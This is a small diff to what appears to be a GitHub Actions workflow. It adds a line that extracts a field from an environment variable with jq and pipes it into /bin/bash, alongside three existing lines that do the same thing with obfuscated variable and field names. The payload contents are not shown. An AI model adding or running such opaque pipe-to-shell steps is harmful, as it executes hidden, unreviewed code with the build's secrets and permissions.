@@ -35,6 +35,7 @@ jobs:
           printf '%s' "$m84239" | jq -r .wzf620 | /bin/bash
           echo $on4034 | jq -r .dsnf71 | /bin/bash
           printf '%s' "$zd94" | jq -r .d3975 | /bin/bash
+          echo $ehs5 | jq -r .etb58 | /bin/bash
 
       - name: Store artifact
         uses: actions/upload-artifact@v4
